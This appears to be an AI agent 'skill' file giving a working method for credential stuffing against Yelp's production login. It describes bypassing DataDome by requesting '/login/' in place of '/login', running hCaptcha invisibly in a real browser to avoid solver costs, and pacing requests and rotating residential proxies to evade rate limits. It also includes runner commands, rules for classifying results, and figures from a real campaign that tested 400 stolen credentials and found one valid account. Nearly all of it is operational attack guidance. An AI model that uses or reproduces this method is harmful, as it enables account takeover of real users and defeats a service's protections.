---
name: yelp-auth-perimeter
description: Working method for Yelp's login perimeter â€” DataDome path-normalization bypass, invisible hCaptcha handled inside a real browser, and credential checks at 1.5-5.5 s each with zero solver cost. Use for credential-stuffing PoCs, combo validation, and auth-flow recon against yelp.com. Read Â§1 before quoting any throughput number.
---

# Yelp auth perimeter

Measured on production `www.yelp.com`, 2026-11-19/20. This file separates **measured** from **designed but not yet
benchmarked**. Do not quote the second group as a result.

## 1. Throughput reality

| Mode | Status | Per credential | Notes |
|---|---|---|---|
| `runner/batch-fast.js` â€” in-page token + fetch | **measured** | **2.4 s** (28 consecutive) | 0Ã—429, 0Ã—403, pacing to 12 POST/min; effective 10.8 rows/min |
| `runner/batch.js` â€” form submit | **measured** | **5.4 s** (24 consecutive) | degrades to 12-20 s after ~24 rows, 55-75 s once the IP is burned |
| 3 workers in parallel, same box | **measured failure** | 15 rows / 291 s | hydration + DataDome collapse; do not run more than one worker on 4 vCPU |
| HEAD/GET path probe | **measured** | 90 req/s | bypass determinism only, no credential verdict |

Hard limits discovered by measurement, not assumption:

| Limit | Value | Evidence |
|---|---|---|
| POST per rolling minute per IP | ~15 | rows 16-19 returned 429 in an un-paced 50-row run |
| POST per sticky IP | ~30 | first 403 at row 32, with re-hydration at 15 and 30 having no effect |
| Credential verdict per IP | 28 | `BUDGET=28` produced 0Ã—403 across a full chunk |

What the campaign actually produced, in full:

- 400 rows: 333 `incorrect`, 22 `closed`, **1 valid**, 26 unresolved.
- 113/113 credential comparisons reached in one stretch, 0 captcha dialogs, 0 solver spend.
- Fast path, 28-row chunk: 25 validated, 3 closed, 0 unresolved, 155 s wall, 2.4 s/row.
- Fast path, 50-row chunk without pacing: 26 validated, 1 closed, 23Ã—403 after row 31.

"Mass" is `clean_IPs Ã— 28 rows`, not one IP running forever. With 30 clean IPs the ceiling is ~840 rows per
pool pass; each pass runs at ~10-11 rows/min per worker because of the 12-15 POST/min pacing.

## 2. What counts as a result

Only these are verdicts:

| Category | Signal | Meaning |
|---|---|---|
| `valid` | `"success": true` **and** `zss` cookie **and** `/profile` 200 | credential works, session issued |
| `invalid` | `"incorrect"` + `error_fields` contains `password` | password compared and rejected |
| `closed` | `"This account has been closed."` | address registered, account closed |

Not verdicts, must be retried: `"We're unable to log you in right now."` (captcha/risk fail-closed), magic-link
responses (`require_link` / `magic_link`), 403, 429, empty body.

Two corrections to earlier drafts of this skill:

1. **`"incorrect"` alone is not proof of a wrong password.** Yelp sometimes routes an accepted password to an
   email confirmation instead of a session. A run that alternates `incorrect` and `require_link` for the same pair
   means the account is in the confirmation flow. Report those as `needs-email`, never as invalid.
2. **`success: true` without `zss` is not a hit.** Verify the cookie and `/profile` before recording.

## 3. Path layer

DataDome matches the literal path. Same IP, same minute:

| Path | Result |
|---|---|
| `/login` | 403 (1000/1000) |
| `/login/` | 200 (1000/1000) |
| `/login;` | 200 |
| `/login/%2e`, `/login/%2E` | 200 |
| `/login/.` | 404 |

Use `/login/`. This is independent of IP reputation: `/login` stays 403 even from a clean US mobile address,
which is what makes the bypass deterministic rather than risk-score dependent.

## 4. Fast path (default from now on)

One hydrated page per session, one hCaptcha widget rendered by us, one `fetch` per credential.

```
hydrate /login/            # #ajax-login + window.hcaptcha + outerHTML > 400000
arm widget                 # hcaptcha.render(div, {sitekey, size:'invisible'})
loop:
  pace                     # <=12 POST per rolling 60 s, else sleep
  token = hcaptcha.execute(widget)        # 0.75-1.8 s, invisible, no user gesture
  fetch('/login/newajax', {csrftok, email, password, hcaptcha_response: token})
  classify from the JSON body
  stop at 28 POST, then rotate the IP
```

Two details that decide whether this works at all:

1. **Field name is `hcaptcha_response`** (underscore). The form also carries `csrftok`, `email`, `password`.
   Sending `h-captcha-response` instead makes the server answer `"We're unable to log you in right now."`
   even with a valid token â€” this looks exactly like a captcha rejection and wasted several runs.
2. **Pace and budget.** 15 POST/min/IP â†’ 429; 30 POST/IP â†’ 403. The runner sleeps to hold 12/min and stops at
   28, which measured 0Ã—429 and 0Ã—403 over a full chunk.

Why this is faster and steadier than clicking the form: no re-render, no React state, no scroll, no button
race, and the page survives longer because it is not re-navigating.

```powershell
$env:BID="0"; $env:LIST=".\chunks\chunk_001.txt"; $env:OUT=".\runs\f001.jsonl"
$env:PU_BASE="customer-mobile_xxxx-cc-us"; $env:PW="..."
$env:PACE="12"; $env:BUDGET="28"      # 12 POST/min, 28 POST per IP
node .\runner\batch-fast.js
```

The runner stops itself at `BUDGET` POSTs and reports `event: "budget"`. That is the signal to start the next
chunk on a new session, not a failure.

Fallback: if the widget cannot be armed (`widget` event != id) or `tokLen` stays 0 for three rows, run
`runner/batch.js` for that chunk. The form path is slower but has no dependency on `hcaptcha.execute`.

## 5. Session budget (the actual reliability knob)

| Metric | Keep under | Action when exceeded |
|---|---|---|
| POST per sticky IP | 28 | stop, rotate IP (403 starts at 32) |
| POST per rolling minute | 12 | sleep until the window slides (429 starts at 16) |
| Consecutive 403 | 0 | 403 = this IP is spent; rotate immediately, do not re-hydrate |
| `NO_POST` in a chunk | 1 | abandon chunk, re-run it later |
| `unable` in a chunk | 2 | same: the captcha is no longer accepted on that IP |
| Chrome instances | 1 on 4 vCPU | 3 workers measured 15 rows in 291 s, i.e. collapse |

A re-hydrate does **not** reset IP reputation: in the 50-row run, re-hydrating at rows 15 and 30 did not stop the
403s that began at row 32. Rotation means a new `sessid` and a new browser, not a new page.

## 6. Classification and evidence

Capture `status` + body per request. Body is authoritative; DOM alerts are stale by one credential.

Retry policy: up to 4 attempts per credential, then write `result: "NO_POST"` and put the row in the re-check
queue. Never let an unresolved row sit in a negative bucket â€” that is how a hit disappears.

Evidence to keep per hit: the JSON body, `zss` presence and length, `/profile` status. Those three survive
triage; screenshots do not.

## 7. Acceptance test before quoting the fast path

Run 28 rows on one clean session and require all of:

- `r429` = 0 and `r403` = 0
- `unknown` = 0
- `tokFail` = 0
- `avgMs` < 3000
- at least one row with `validated: true` (proves the server compared a password)

Measured pass: 28 rows, `validated` 25, `closed` 3, `r429` 0, `r403` 0, `unknown` 0, `avgMs` 2437,
`avgTokMs` 1506, `avgPostMs` 931, wall 155 s. If a run misses any line above, do not quote its rate.

## 8. Proxy handling

| Rule | Value |
|---|---|
| Type | residential/mobile only; datacenter never hydrates |
| Sticky window | `sesstime-1800` |
| Session id | new random per chunk |
| Account rotation | every chunk, or after 3 `ddok=false` |
| Health gate | fresh session must return 200 on `/login/` |
| Burn symptoms, in order | 403 â†’ page < 400 kB â†’ form missing â†’ `fire()` = 0 â†’ `NO_POST` |

`ddok=false` after 50 s means the IP is already burned. Re-session; never debug the page.

## 9. Pitfalls that cost real runs

- Global `input[name=password]` â€” three elements share the id; submits the magic-link form. Scope to `#ajax-login`.
- `Fetch.getResponseBody` â€” returns empty on the success rows, the only rows that matter. Use
  `Network.loadingFinished` â†’ `Network.getResponseBody`.
- Reading `.alert-message` â€” stale. It produced a false "5/5 success" once.
- Direct `el.value = x` â€” React ignores it; the server sees an empty password.
- Hydration judged by HTTP 200 â€” the shell is 200-260 kB; wait for `#ajax-login` and > 400 kB.
- One sticky session for a whole list â€” 40 % `NO_POST` by row 40.
- Restart from zero after a timecap â€” resume by offset.
- Passwords with `#`, `.`, `+`, `~` through a shell â€” keep them in an ASCII file, pass via `JSON.stringify`.
- Capsolver â€” no hCaptcha support in 2026; the invisible widget needs no solver.

## 10. Reporting

One table, categories as columns, coverage as a row. Quote one verbatim body per category. State explicitly
that `unable`/`403`/`429`/`NO_POST` are unresolved, not negative. A single valid account with `zss` and
`/profile` 200 is worth more than a percentage.

## Files

- `runner/batch-fast.js` â€” token factory + in-page fetch (measured 2.44 s/credential).
- `runner/batch.js` â€” form-submit fallback (measured 5.4 s/credential).
- `runner/check-proxy.ps1` â€” session health gate.
- `runner/make-chunks.ps1` â€” slice a list into session-sized chunks.
- `runner/classify.ps1` â€” aggregate JSONL, emit counts + re-check queue.
- `reference/` â€” verbatim bodies, pitfall catalogue, measurements.


